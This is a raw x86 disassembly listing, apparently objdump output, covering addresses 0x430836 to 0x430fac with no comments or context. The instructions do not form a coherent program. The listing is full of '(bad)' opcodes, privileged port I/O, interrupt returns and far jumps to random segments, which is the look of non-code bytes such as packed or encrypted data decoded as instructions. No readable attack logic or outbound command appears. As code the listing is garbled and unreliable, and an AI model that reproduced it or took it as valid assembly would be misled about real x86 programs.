  430836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430837:	aaa    
  430838:	rol    BYTE PTR [edx],0x86
  43083b:	jo     0x430866
  43083d:	mov    ch,0x3e
  43083f:	test   eax,0x6b3220a0
  430844:	inc    ecx
  430845:	push   ss
  430846:	dec    ecx
  430847:	pop    ebp
  430848:	adc    ebp,edi
  43084a:	adc    ah,BYTE PTR [ebx-0x6b9d4441]
  430850:	mov    dl,0xda
  430852:	jecxz  0x43082e
  430854:	ja     0x430813
  430856:	outs   dx,DWORD PTR ds:[esi]
  430857:	mov    DWORD PTR [edx+0x44],esi
  43085a:	repz aas 
  43085c:	push   0x3564a19b
  430861:	jg     0x4307e7
  430863:	xor    eax,DWORD PTR [edx-0x7e]
  430866:	sub    edx,DWORD PTR [ecx]
  430868:	pop    ebx
  430869:	xor    eax,0x3f9a921
  43086e:	mov    eax,ds:0xf6bc5e69
  430873:	add    ah,bl
  430875:	add    al,0xb5
  430877:	pop    esi
  430878:	dec    ebp
  430879:	xor    esp,ebp
  43087b:	mov    al,0x69
  43087d:	ja     0x43085a
  43087f:	xchg   edi,eax
  430880:	xchg   esi,eax
  430881:	sub    BYTE PTR [eax],al
  430883:	and    dl,0xd9
  430886:	cdq    
  430887:	and    ah,ah
  430889:	aam    0x50
  43088b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43088c:	lods   al,BYTE PTR ds:[esi]
  43088d:	mov    fs,WORD PTR [edi-0x65]
  430890:	pusha  
  430891:	push   cs
  430892:	push   esp
  430893:	and    eax,0x43025533
  430898:	outs   dx,DWORD PTR ds:[esi]
  430899:	int    0xd3
  43089b:	enter  0xdcdd,0x72
  43089f:	packuswb mm1,mm0
  4308a2:	mov    WORD PTR [ebx+edi*4+0x10],gs
  4308a6:	add    eax,0x273940d
  4308ab:	dec    edi
  4308ac:	dec    eax
  4308ad:	retf   0xfa0
  4308b0:	pop    ss
  4308b1:	and    al,bh
  4308b3:	fiadd  DWORD PTR [edi+0x7889be7c]
  4308b9:	jmp    0x879b:0x6e1385f6
  4308c0:	sbb    DWORD PTR [ecx],ebx
  4308c2:	pop    DWORD PTR [edx]
  4308c4:	call   0xd87e:0x92d7c152
  4308cb:	dec    eax
  4308cc:	xor    al,0x8b
  4308ce:	(bad)  
  4308cf:	shl    BYTE PTR [eax-0x3554c2a4],0x70
  4308d6:	inc    esi
  4308d7:	adc    al,cl
  4308d9:	dec    ebp
  4308da:	mov    ebp,0x14d1aa16
  4308df:	sbb    BYTE PTR [edx+0x11],al
  4308e2:	outs   dx,DWORD PTR ds:[esi]
  4308e3:	pop    ss
  4308e4:	and    al,0xa6
  4308e6:	(bad)  
  4308e8:	in     eax,0x53
  4308ea:	mov    cl,0x4e
  4308ec:	and    eax,0x2344ba0d
  4308f1:	sti    
  4308f2:	inc    edi
  4308f3:	jp     0x43095a
  4308f5:	aam    0x12
  4308f7:	(bad)  
  4308f8:	shr    DWORD PTR [ebp-0x32],1
  4308fb:	pop    ds
  4308fc:	xchg   esi,eax
  4308fd:	jae    0x4308fe
  4308ff:	sub    eax,0xe94c668a
  430904:	dec    esi
  430905:	iret   
  430906:	xor    eax,0x87c4b741
  43090b:	call   0xfcfb:0xf7e615bd
  430912:	out    dx,eax
  430913:	xchg   ebx,eax
  430914:	ja     0x430953
  430916:	inc    edi
  430917:	sbb    ebp,0x78
  43091a:	ss xor al,0xb1
  43091d:	or     BYTE PTR [esi+ecx*8],bl
  430920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430921:	mov    esp,0x1e814a3d
  430926:	cmp    al,0x1f
  430928:	fs nop
  43092a:	inc    ebx
  43092b:	inc    edx
  43092c:	ins    BYTE PTR es:[edi],dx
  43092d:	mov    ch,BYTE PTR [ecx-0x59]
  430930:	adc    esp,DWORD PTR [esi]
  430932:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430933:	add    DWORD PTR [eax+0x3b8de647],0xffffff98
  43093a:	add    ch,dl
  43093c:	loope  0x4308d8
  43093e:	std    
  43093f:	add    ch,BYTE PTR [ecx-0x70]
  430942:	lods   eax,DWORD PTR ds:[esi]
  430943:	retf   0xa2dc
  430946:	xchg   ecx,eax
  430947:	(bad)  
  430948:	jbe    0x43095c
  43094a:	add    eax,0xeb69ccf8
  43094f:	pop    esi
  430951:	sbb    eax,0x746398ca
  430956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430957:	aad    0x52
  430959:	inc    eax
  43095a:	jno    0x43092c
  43095c:	pop    esp
  43095d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43095e:	cmp    al,dl
  430960:	out    0x9d,al
  430962:	popa   
  430963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430964:	outs   dx,BYTE PTR ds:[esi]
  430965:	sub    esi,DWORD PTR [eax-0x1d30d48f]
  43096b:	inc    esi
  43096c:	sub    al,0x33
  43096e:	int3   
  43096f:	push   0x56946150
  430974:	sbb    DWORD PTR [ebp-0x54],ecx
  430977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430978:	les    edx,FWORD PTR [edi]
  43097a:	nop
  43097b:	enter  0xa428,0x70
  43097f:	xchg   ebp,eax
  430980:	cli    
  430981:	leave  
  430982:	jns    0x430973
  430984:	inc    ebx
  430985:	jb     0x430935
  430987:	test   BYTE PTR [edi+eax*8],ch
  43098a:	and    ah,bl
  43098c:	ss xchg ebx,eax
  43098e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43098f:	push   es
  430990:	loop   0x4309f6
  430992:	ins    BYTE PTR es:[edi],dx
  430993:	or     DWORD PTR ds:0xc80af4ba,0xffffff80
  43099a:	add    dh,0xa
  43099d:	pop    ebp
  43099e:	int    0x54
  4309a0:	or     dl,ch
  4309a2:	sub    eax,0x2d57874f
  4309a7:	inc    esp
  4309a8:	cmp    BYTE PTR [edi+0x46e9d1a0],ah
  4309ae:	xchg   ebp,eax
  4309af:	imul   ebx,DWORD PTR [esi+eiz*2-0x2d],0xeaa98888
  4309b7:	ins    DWORD PTR es:[edi],dx
  4309b8:	xchg   esi,eax
  4309b9:	cwde   
  4309ba:	push   esi
  4309bb:	push   ebp
  4309bc:	pcmpgtw mm0,mm0
  4309bf:	mov    ds:0xba7285bb,eax
  4309c4:	mov    dh,0x6a
  4309c6:	mov    bl,0x23
  4309c8:	push   eax
  4309c9:	xchg   DWORD PTR [edi-0x11],esi
  4309cc:	xchg   ebp,eax
  4309cd:	jmp    0x942a345a
  4309d2:	cld    
  4309d3:	dec    edx
  4309d4:	xchg   ecx,eax
  4309d5:	sbb    dl,BYTE PTR [ebp-0x718ba474]
  4309db:	pop    ecx
  4309dc:	mov    WORD PTR [edi+0x35929438],gs
  4309e2:	sub    al,0x16
  4309e4:	sub    DWORD PTR [eax+0xf],esp
  4309e7:	cmp    al,0x48
  4309e9:	pop    esp
  4309ea:	cld    
  4309eb:	shl    DWORD PTR [edi],cl
  4309ed:	mov    dl,0xb1
  4309ef:	imul   edx,DWORD PTR [ecx],0x3b
  4309f2:	bound  esp,QWORD PTR [ecx]
  4309f4:	adc    al,0x44
  4309f6:	cli    
  4309f7:	(bad)  
  4309f8:	push   ecx
  4309f9:	fwait
  4309fa:	aaa    
  4309fb:	aaa    
  4309fc:	inc    esi
  4309fd:	(bad)  
  4309fe:	cli    
  4309ff:	rcr    DWORD PTR [ebx],1
  430a01:	out    dx,al
  430a02:	and    al,0x97
  430a04:	test   BYTE PTR [eax],ah
  430a06:	rcr    BYTE PTR [ecx+0x29d83a63],1
  430a0c:	mov    bl,0xf5
  430a0e:	icebp  
  430a0f:	(bad)  
  430a10:	loope  0x430a7b
  430a12:	ins    DWORD PTR es:[edi],dx
  430a13:	cmp    ebp,DWORD PTR [eax]
  430a15:	pop    eax
  430a16:	out    dx,eax
  430a17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430a18:	sbb    ch,dl
  430a1a:	inc    edi
  430a1b:	jmp    0xfb3bfc3a
  430a20:	sbb    al,0x53
  430a22:	pop    eax
  430a23:	rep stos DWORD PTR es:[edi],eax
  430a25:	arpl   di,sp
  430a27:	mov    edi,0x32231c63
  430a2c:	mov    dl,0xfc
  430a2e:	lods   eax,DWORD PTR ds:[esi]
  430a2f:	fs pop esi
  430a31:	xchg   edx,eax
  430a32:	aas    
  430a33:	cs (bad) 
  430a35:	mov    esi,0xf3993f56
  430a3a:	das    
  430a3b:	cmp    al,0x27
  430a3d:	retf   0x2a24
  430a40:	loop   0x430a08
  430a42:	mov    al,ds:0x536459da
  430a47:	dec    edi
  430a48:	cs mov dl,cl
  430a4b:	adc    dh,BYTE PTR [edx]
  430a4d:	and    ah,dh
  430a4f:	xchg   ebp,eax
  430a50:	data16 mov dl,BYTE PTR [edi-0x37d14d1a]
  430a57:	mov    al,ds:0xec55b142
  430a5c:	popf   
  430a5d:	xlat   BYTE PTR ds:[ebx]
  430a5e:	xchg   DWORD PTR [esi+0x4b894476],ecx
  430a64:	fmul   DWORD PTR [ebp+ebx*2-0x312bb602]
  430a6b:	rcl    BYTE PTR [ebx+eax*2],0x6b
  430a6f:	ins    BYTE PTR es:[edi],dx
  430a70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430a71:	test   al,0x6b
  430a73:	shl    dh,0x95
  430a76:	adc    ebp,DWORD PTR [ecx+0x71]
  430a79:	inc    ebx
  430a7a:	add    eax,0x5e9bf08d
  430a7f:	(bad)
  430a82:	or     edi,ebx
  430a84:	aas    
  430a85:	jle    0x430a5c
  430a87:	jo     0x430a9c
  430a89:	adc    DWORD PTR [edi+ebp*2-0x75c3a5aa],ebp
  430a90:	jne    0x430a52
  430a92:	(bad)  
  430a93:	repz stc 
  430a95:	lods   eax,DWORD PTR ds:[esi]
  430a96:	out    dx,al
  430a97:	ds dec ebx
  430a99:	pop    eax
  430a9a:	sbb    ah,ah
  430a9c:	xchg   ecx,eax
  430a9d:	rcr    BYTE PTR [edi+0xe],1
  430aa0:	mov    edx,0xd2373feb
  430aa5:	add    ecx,ebp
  430aa7:	push   esi
  430aa9:	cmc    
  430aaa:	ficomp DWORD PTR [edx-0x7ba997a7]
  430ab0:	mov    edi,0x11b7f902
  430ab5:	fxtract 
  430ab7:	mov    edx,0x33a3a36f
  430abc:	mov    ah,0xa8
  430abe:	js     0x430aae
  430ac0:	add    al,0x90
  430ac2:	aam    0xe1
  430ac4:	sbb    bh,BYTE PTR [esi]
  430ac6:	inc    ebx
  430ac7:	pop    ecx
  430ac8:	clc    
  430ac9:	cli    
  430aca:	mov    esi,0x48293c10
  430acf:	mov    ecx,0xe4aee181
  430ad4:	ret    
  430ad5:	add    DWORD PTR [eax+esi*4-0x343931d],0x5f4648b1
  430ae0:	scas   eax,DWORD PTR es:[edi]
  430ae1:	mov    ch,bl
  430ae3:	loopne 0x430b60
  430ae5:	dec    esi
  430ae6:	jne    0x430abc
  430ae8:	xor    cl,ah
  430aea:	sub    ebp,DWORD PTR [ebx]
  430aec:	mov    dl,0xbb
  430aee:	jecxz  0x430a80
  430af0:	sti    
  430af1:	or     BYTE PTR [edx-0x1ccf267d],cl
  430af7:	mov    al,ds:0x280aea9b
  430afc:	xor    BYTE PTR [esi+0x4571ba00],al
  430b02:	outs   dx,BYTE PTR ds:[esi]
  430b03:	or     eax,0x7fed41eb
  430b08:	scas   eax,DWORD PTR es:[edi]
  430b09:	jmp    0x1659c4ea
  430b0e:	and    edx,esp
  430b10:	dec    esp
  430b12:	inc    edi
  430b13:	loop   0x430ac2
  430b15:	sbb    al,0x7b
  430b17:	sbb    BYTE PTR [eax+ebx*1],cl
  430b1a:	aas    
  430b1b:	inc    eax
  430b1c:	out    dx,eax
  430b1d:	jp     0x430b06
  430b1f:	fnstenv [ebp-0x4d39f2dd]
  430b25:	mov    esi,0xe1962235
  430b2a:	dec    esp
  430b2b:	hlt    
  430b2c:	xor    BYTE PTR [ebp+0x73],bh
  430b2f:	adc    edi,ebx
  430b31:	fstp   DWORD PTR [edi-0x19]
  430b34:	stos   BYTE PTR es:[edi],al
  430b35:	sbb    eax,DWORD PTR [ecx-0x43c44746]
  430b3b:	pop    es
  430b3c:	jp     0x430b40
  430b3e:	mov    al,ds:0x176bd0cc
  430b43:	inc    esp
  430b44:	jg     0x430ade
  430b46:	mov    eax,ds:0xc1b83db2
  430b4b:	mov    ah,0xdc
  430b4d:	push   ebp
  430b4e:	sar    bh,cl
  430b50:	and    dl,al
  430b52:	ja     0x430afa
  430b54:	mov    ch,0xed
  430b56:	idiv   esi
  430b58:	adc    BYTE PTR [ebp-0x72],ah
  430b5b:	les    esi,FWORD PTR [esi-0x21c91593]
  430b61:	sbb    BYTE PTR [esi],bh
  430b63:	scas   al,BYTE PTR es:[edi]
  430b64:	inc    ecx
  430b65:	add    eax,0x61220557
  430b6a:	xor    esi,DWORD PTR [ecx-0x55]
  430b6d:	xor    ebx,DWORD PTR [ecx]
  430b6f:	imul   ebp,DWORD PTR [edx],0xb836a542
  430b75:	aas    
  430b76:	mov    ah,0x5d
  430b78:	add    ecx,DWORD PTR [esi]
  430b7a:	jae    0x430baf
  430b7c:	mov    dh,0xe1
  430b7e:	pop    ds
  430b7f:	inc    edi
  430b80:	dec    ebx
  430b82:	add    BYTE PTR [ecx],dh
  430b84:	jge    0x430c05
  430b86:	cld    
  430b87:	arpl   cx,bx
  430b89:	adc    edx,DWORD PTR [edx+0x7a]
  430b8c:	inc    edx
  430b8d:	mov    ch,0xa1
  430b8f:	pop    ebp
  430b90:	jbe    0x430b78
  430b92:	mov    esp,0x3afe76ce
  430b97:	jae    0x430bfd
  430b99:	ficomp DWORD PTR [ebx]
  430b9b:	lea    edx,[ebx-0x3]
  430b9e:	loopne 0x430bd8
  430ba0:	jge    0x430bb0
  430ba2:	(bad)  
  430ba3:	loope  0x430bdf
  430ba5:	das    
  430ba6:	pop    ss
  430ba7:	dec    esp
  430ba8:	inc    esi
  430ba9:	xchg   esi,eax
  430baa:	sar    edx,1
  430bac:	icebp  
  430bad:	inc    ecx
  430bae:	inc    edx
  430bb0:	dec    edx
  430bb1:	js     0x430bc8
  430bb3:	pop    es
  430bb4:	(bad)  
  430bb5:	xchg   ebx,eax
  430bb6:	push   ecx
  430bb7:	lods   al,BYTE PTR ds:[esi]
  430bb8:	cmovae ecx,esp
  430bbb:	push   ecx
  430bbc:	popf   
  430bbd:	cwde   
  430bbe:	dec    eax
  430bbf:	add    bl,BYTE PTR [esi]
  430bc1:	pop    esi
  430bc2:	push   cs
  430bc3:	sti    
  430bc4:	fidivr DWORD PTR [esi+0x52]
  430bc7:	cmp    DWORD PTR [edx],esi
  430bc9:	mov    ch,BYTE PTR [ebx-0x7a]
  430bcc:	or     BYTE PTR [ebx+0x4e],al
  430bcf:	loopne 0x430bb5
  430bd1:	adc    BYTE PTR [ebx],bh
  430bd3:	or     DWORD PTR [ebp+0x7aa76bf4],ecx
  430bd9:	mov    al,0xbc
  430bdb:	stc    
  430bdc:	xchg   esi,eax
  430bdd:	inc    eax
  430bde:	in     al,dx
  430bdf:	dec    ecx
  430be0:	mov    ebx,0x3b8479ae
  430be5:	mov    ah,0x81
  430be7:	mov    BYTE PTR [ebx+0x1e0286cc],dl
  430bed:	jp     0x430c35
  430bef:	dec    ebx
  430bf0:	outs   dx,DWORD PTR ds:[esi]
  430bf1:	sbb    al,0x2a
  430bf3:	es call 0x9029:0x8343f66f
  430bfb:	jbe    0x430c4b
  430bfd:	or     al,0x71
  430bff:	sbb    BYTE PTR [ebx+eax*4],dh
  430c02:	es (bad) 
  430c04:	sbb    bh,BYTE PTR [edi-0x63]
  430c07:	scas   eax,DWORD PTR es:[edi]
  430c08:	inc    edx
  430c09:	jmp    0xbb6184ff
  430c0e:	arpl   WORD PTR [ecx+0x28d6598a],dx
  430c14:	cmp    eax,0x42d0e7a6
  430c19:	test   BYTE PTR [eax],ah
  430c1b:	gs or  eax,0xc22865b
  430c21:	hlt    
  430c22:	add    eax,0x84c6efa0
  430c27:	fcom   QWORD PTR [edi+0x190761d0]
  430c2d:	add    esp,ebx
  430c2f:	mov    edi,0xe35e6adc
  430c34:	cmp    bh,dh
  430c36:	sub    ah,cl
  430c38:	fmul   DWORD PTR [eax-0x7568995a]
  430c3e:	mov    ebx,DWORD PTR [eax-0x60]
  430c41:	in     al,dx
  430c42:	rcr    DWORD PTR [ebp-0x31],1
  430c45:	dec    ecx
  430c46:	(bad)  
  430c47:	pop    ecx
  430c48:	out    0xf4,al
  430c4a:	push   esp
  430c4b:	add    al,0x81
  430c4d:	mov    ebp,0x629c8a5a
  430c52:	add    BYTE PTR [edx+0x434a8889],ah
  430c58:	call   FWORD PTR [ecx-0x7e1df80a]
  430c5e:	call   0x4888ff23
  430c63:	outs   dx,BYTE PTR ds:[esi]
  430c64:	fidivr WORD PTR [edx+esi*8+0x3d]
  430c68:	ins    BYTE PTR es:[edi],dx
  430c69:	push   eax
  430c6a:	jno    0x430c43
  430c6c:	(bad)  
  430c6d:	mov    eax,ds:0xa0258866
  430c72:	cdq    
  430c73:	xchg   edi,eax
  430c74:	hlt    
  430c75:	pop    edx
  430c76:	pusha  
  430c77:	inc    ebp
  430c78:	nop
  430c79:	imul   eax,DWORD PTR [ebx-0x63a4c50],0x65
  430c80:	aaa    
  430c81:	retf   
  430c82:	test   BYTE PTR [esi],dl
  430c84:	sbb    ah,BYTE PTR [ecx-0x7]
  430c87:	pop    ds
  430c88:	rol    DWORD PTR [esi],1
  430c8a:	scas   al,BYTE PTR es:[edi]
  430c8b:	icebp  
  430c8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430c8d:	cmp    eax,0x3898fdf8
  430c92:	mov    ah,0x82
  430c94:	add    dl,ch
  430c96:	shr    BYTE PTR [edi+0x4e],cl
  430c99:	fidiv  DWORD PTR [edx-0x6d]
  430c9c:	xlat   BYTE PTR ds:[ebx]
  430c9d:	xchg   esi,eax
  430c9e:	inc    ebx
  430c9f:	test   ah,0x43
  430ca2:	and    ebp,DWORD PTR [edi+0x28]
  430ca5:	jmp    0x2337f5db
  430caa:	in     eax,dx
  430cab:	inc    edx
  430cac:	ja     0x430cf8
  430cae:	ret    0x82b8
  430cb1:	jo     0x430cf4
  430cb3:	int3   
  430cb4:	mov    ecx,0xef3b9ad1
  430cb9:	mov    esp,0x40474c4
  430cbe:	cmp    edi,DWORD PTR [eax]
  430cc0:	daa    
  430cc1:	cli    
  430cc2:	dec    ebx
  430cc3:	jge    0x430c52
  430cc5:	ret    0xe9ad
  430cc8:	loop   0x430d0b
  430cca:	ja     0x430cd2
  430ccc:	in     al,0x71
  430cce:	jmp    0x8a7d:0xddab0661
  430cd5:	mov    eax,DWORD PTR [esi]
  430cd7:	sub    eax,0xaaa4b94f
  430cdc:	jmp    0x429:0xaa12d5a2
  430ce3:	fild   QWORD PTR [ebx+0x7a82c056]
  430ce9:	out    dx,eax
  430cea:	xor    BYTE PTR [ebp+0x46],dl
  430ced:	xor    DWORD PTR [ebx+0x5042bea4],0xfffffff6
  430cf4:	stos   DWORD PTR es:[edi],eax
  430cf5:	xor    al,0xe6
  430cf7:	pop    ebp
  430cf8:	(bad)  
  430cf9:	cmc    
  430cfa:	dec    edx
  430cfb:	xchg   dl,al
  430cfd:	rol    ch,1
  430cff:	xor    bl,BYTE PTR [edi+0x1e8cf00e]
  430d05:	mov    al,0xdc
  430d07:	pushf  
  430d08:	pop    ss
  430d09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430d0a:	adc    eax,0x97c7f25
  430d0f:	aad    0xf4
  430d11:	popa   
  430d12:	jl     0x430d21
  430d14:	fistp  WORD PTR [edi+edx*8+0x3b]
  430d18:	ds test dh,al
  430d1b:	fadd   QWORD PTR [eax]
  430d1d:	fild   WORD PTR [esi]
  430d1f:	jnp    0x430cbf
  430d21:	dec    edi
  430d22:	scas   eax,DWORD PTR es:[edi]
  430d23:	fbstp  TBYTE PTR [edi]
  430d25:	dec    esi
  430d26:	xor    al,0xb6
  430d28:	mov    ebp,DWORD PTR ds:[ecx]
  430d2b:	jne    0x430cdb
  430d2d:	pop    ecx
  430d2e:	imul   ebp,DWORD PTR [esp+eax*4-0x45],0xfffffffb
  430d33:	adc    eax,0x1600a31c
  430d38:	sti    
  430d39:	dec    eax
  430d3a:	jge    0x430cc2
  430d3c:	and    BYTE PTR [ecx+0x22],0xa0
  430d40:	mov    bh,0xbe
  430d42:	xchg   edi,eax
  430d43:	xor    BYTE PTR [edx+ecx*1+0x5f],0xe8
  430d48:	aas    
  430d49:	jmp    0x13a1:0x29bc30f5
  430d50:	faddp  st(7),st
  430d52:	inc    esp
  430d53:	iret   
  430d54:	dec    eax
  430d55:	into   
  430d56:	add    ecx,DWORD PTR [ecx]
  430d58:	push   eax
  430d59:	ja     0x430dcc
  430d5b:	jle    0x430cf3
  430d5d:	jge    0x430d7c
  430d5f:	mov    bl,0x3e
  430d61:	push   es
  430d62:	test   al,0xee
  430d64:	fwait
  430d65:	repnz sahf 
  430d67:	adc    edx,ebp
  430d69:	test   BYTE PTR [ebx+0x176a816],ch
  430d6f:	cmp    al,0xce
  430d71:	ds (bad) 
  430d73:	sar    DWORD PTR [ecx+0x61],cl
  430d76:	fnstenv [ebx]
  430d78:	in     al,0xa1
  430d7a:	popa   
  430d7b:	popa   
  430d7c:	push   0x1c
  430d7e:	inc    eax
  430d7f:	or     ch,bh
  430d81:	adc    DWORD PTR [ebx],esp
  430d83:	dec    edx
  430d84:	call   0xcb190fee
  430d89:	mov    BYTE PTR [ebx],dh
  430d8b:	retf   
  430d8c:	cwde   
  430d8d:	jns    0x430d74
  430d8f:	mov    ebx,0x8c3e96b3
  430d94:	jae    0x430dec
  430d96:	loope  0x430d3f
  430d98:	push   esi
  430d99:	into   
  430d9a:	jo     0x430ddc
  430d9c:	xor    DWORD PTR [esp+edx*2-0x3c],esi
  430da0:	or     al,0xfd
  430da2:	fild   QWORD PTR gs:[ebx+ebx*4-0x70ec8229]
  430daa:	dec    edx
  430dab:	ret    
  430dac:	bound  ecx,QWORD PTR [eax]
  430dae:	inc    ebx
  430daf:	arpl   WORD PTR [eax-0x6a],cx
  430db2:	lahf   
  430db3:	inc    ecx
  430db4:	jb     0x430d8e
  430db6:	jno    0x430e0e
  430db8:	inc    edx
  430db9:	(bad)  
  430dba:	add    ax,0x3d76
  430dbe:	daa    
  430dbf:	sub    ah,BYTE PTR [ebx-0x2e]
  430dc2:	dec    esp
  430dc3:	adc    ecx,eax
  430dc5:	and    eax,DWORD PTR [esi+0x21865beb]
  430dcb:	jmp    DWORD PTR [eax+0x25ff333]
  430dd1:	mov    WORD PTR [ecx+0x32d0b901],cs
  430dd7:	(bad)  
  430dd8:	sti    
  430dd9:	ins    DWORD PTR es:[edi],dx
  430dda:	push   edi
  430ddb:	fs and eax,0x87a0d308
  430de1:	enter  0x46f6,0xb3
  430de5:	or     BYTE PTR [esi],bh
  430de7:	or     ecx,DWORD PTR [eax]
  430de9:	push   0x25
  430deb:	adc    edi,edx
  430ded:	pop    ss
  430dee:	call   0xdd5f:0xe5cdfc62
  430df5:	lods   al,BYTE PTR ds:[esi]
  430df6:	fcom   DWORD PTR [ebx]
  430df8:	jno    0x430d9d
  430dfa:	or     al,0x7d
  430dfc:	xchg   esi,eax
  430dfd:	in     al,0x31
  430dff:	cwde   
  430e00:	aas    
  430e01:	pop    ebx
  430e02:	push   esp
  430e03:	jmp    0x430e4e
  430e05:	adc    BYTE PTR [ebp+0x4d18491f],ah
  430e0b:	ret    
  430e0c:	xor    eax,0xb85ba386
  430e11:	loopne 0x430e73
  430e13:	or     BYTE PTR [edi+0x18],dl
  430e16:	imul   BYTE PTR [ecx]
  430e18:	fistp  WORD PTR [edi-0x7955f910]
  430e1e:	sub    eax,0xc6f5990f
  430e23:	xchg   ebx,eax
  430e24:	lods   eax,DWORD PTR ds:[esi]
  430e25:	mov    eax,ds:0x270a2d22
  430e2a:	push   esp
  430e2b:	pop    ebx
  430e2c:	dec    ebx
  430e2d:	sbb    DWORD PTR [ebp+ecx*8+0x60c32a7a],0x7103dbfa
  430e38:	retf   0xd55c
  430e3b:	hlt    
  430e3c:	xor    bl,BYTE PTR [eax+0x2b]
  430e3f:	and    DWORD PTR [eax+eiz*2+0x7858b7d9],0x1d6ba46c
  430e4a:	cmc    
  430e4b:	jge    0x430e37
  430e4d:	xchg   ebp,eax
  430e4e:	ja     0x430e86
  430e50:	jge    0x430e6a
  430e52:	cmp    DWORD PTR [eax+0x13b17988],ecx
  430e58:	dec    edx
  430e59:	pop    esi
  430e5a:	test   BYTE PTR [esi+0x3d5fde2b],ah
  430e60:	cli    
  430e61:	mov    edx,0x333a3d7c
  430e66:	sub    DWORD PTR [ebp-0xc],ebp
  430e69:	adc    dl,BYTE PTR [esi+ecx*8-0x5b345597]
  430e70:	add    BYTE PTR [ebp-0x3c],ch
  430e73:	dec    eax
  430e74:	cmp    DWORD PTR [eax+ecx*2+0x5b],edx
  430e78:	push   ebp
  430e79:	popa   
  430e7a:	mov    bh,0x2c
  430e7c:	push   edi
  430e7d:	(bad)  
  430e7e:	sar    DWORD PTR [ebx-0x34],1
  430e81:	xchg   ebp,eax
  430e82:	pop    ss
  430e83:	inc    ebp
  430e84:	xchg   ebp,eax
  430e85:	adc    DWORD PTR [esi-0x1c5494c7],edx
  430e8b:	xchg   esp,eax
  430e8c:	clc    
  430e8d:	sub    bh,BYTE PTR [ebx+0x38f7d2f]
  430e93:	and    eax,0x687d0164
  430e98:	shr    DWORD PTR [ebx+0x66],0xb8
  430e9c:	inc    esp
  430e9d:	inc    esi
  430e9e:	loopne 0x430e80
  430ea0:	sbb    bl,cl
  430ea2:	loopne 0x430e3e
  430ea4:	dec    edi
  430ea5:	retf   
  430ea6:	push   edx
  430ea7:	xor    ecx,ebp
  430ea9:	dec    edx
  430eaa:	sub    al,0x9b
  430eac:	sar    BYTE PTR [edx-0x75d81c03],cl
  430eb2:	retf   
  430eb3:	arpl   WORD PTR [edx+0x66],dx
  430eb6:	(bad)  
  430eb7:	jg     0x430e87
  430eb9:	int    0xe3
  430ebb:	add    al,0x9a
  430ebd:	pop    ds
  430ebe:	inc    esi
  430ebf:	sahf   
  430ec0:	dec    ebx
  430ec1:	loope  0x430e87
  430ec3:	adc    eax,0x597fbb4
  430ec8:	mov    DWORD PTR [ecx+0x35],eax
  430ecb:	pushf  
  430ecc:	dec    eax
  430ecd:	das    
  430ece:	out    0x6a,eax
  430ed0:	popa   
  430ed1:	js     0x430e5a
  430ed3:	jae    0x430f4b
  430ed5:	call   DWORD PTR ds:0x3446358c
  430edb:	inc    esi
  430edc:	or     al,0x60
  430ede:	sbb    ah,BYTE PTR [esi-0x7e]
  430ee1:	(bad)
  430ee4:	push   cs
  430ee5:	ret    
  430ee6:	jo     0x430eff
  430ee8:	scas   al,BYTE PTR es:[edi]
  430ee9:	add    eax,0x66d07a80
  430eee:	lock std 
  430ef0:	bound  edi,QWORD PTR [esi+edi*4]
  430ef3:	mov    bh,BYTE PTR [ebx]
  430ef5:	es test eax,0xd11cd0f6
  430efb:	pop    edx
  430efc:	dec    ebx
  430efd:	loopne 0x430f70
  430eff:	push   cs
  430f00:	ins    DWORD PTR es:[edi],dx
  430f01:	dec    esp
  430f02:	push   es
  430f03:	mov    cl,0x51
  430f05:	loopne 0x430f40
  430f07:	sub    bl,al
  430f09:	test   BYTE PTR [edx+0x4491bb88],dl
  430f0f:	in     al,dx
  430f10:	xor    DWORD PTR [esi+0xd969055],eax
  430f16:	fs jne 0x430ed6
  430f19:	call   0xaffe:0x311b86bb
  430f20:	adc    DWORD PTR [ebp+esi*4-0x4eebd7df],0x26a58ca0
  430f2b:	sahf   
  430f2c:	sahf   
  430f2d:	retf   
  430f2e:	or     eax,0x616b6fdd
  430f33:	nop
  430f34:	fs dec esp
  430f36:	mov    esi,0xa411669a
  430f3b:	or     eax,0x15bd5d3
  430f40:	in     al,0x32
  430f42:	iret   
  430f43:	out    dx,eax
  430f44:	mov    esi,0xc030ae25
  430f49:	cli    
  430f4a:	sti    
  430f4b:	pushf  
  430f4c:	pop    ds
  430f4d:	push   esi
  430f4e:	repnz mov cs:0x14e671a8,al
  430f55:	xchg   ebp,eax
  430f56:	push   es
  430f57:	lods   eax,DWORD PTR ds:[esi]
  430f58:	and    al,0x32
  430f5a:	and    DWORD PTR [ecx-0x29a5d669],eax
  430f60:	pop    es
  430f61:	repz or BYTE PTR [ebp-0x348dfffb],bl
  430f68:	xlat   BYTE PTR ds:[ebx]
  430f69:	aaa    
  430f6a:	add    esi,esp
  430f6c:	call   0x3fcae78f
  430f71:	pop    esp
  430f72:	inc    ecx
  430f73:	xchg   esi,eax
  430f74:	cmp    al,0xa3
  430f76:	retf   0xcde9
  430f79:	and    al,0x21
  430f7b:	test   eax,0xb1ff2025
  430f80:	adc    ecx,edi
  430f82:	ficomp WORD PTR [esi]
  430f84:	add    dl,BYTE PTR [edx+edx*4+0x52]
  430f88:	mov    ecx,DWORD PTR [edx]
  430f8a:	fs jbe 0x430f85
  430f8d:	adc    cl,dl
  430f8f:	loopne 0x430f88
  430f91:	mov    al,0x13
  430f93:	int    0xe4
  430f95:	dec    edi
  430f96:	test   DWORD PTR [ecx],ecx
  430f98:	mov    dl,0xc2
  430f9a:	cmp    ebx,edx
  430f9c:	pop    edi
  430f9d:	test   BYTE PTR [edx-0x5c],dl
  430fa0:	jo     0x430f33
  430fa2:	rcr    BYTE PTR [eax+0x59],0x9b
  430fa6:	xchg   esi,eax
  430fa7:	jbe    0x430f48
  430fa9:	lock loop 0x430f6f
  430fac:	dec    edi
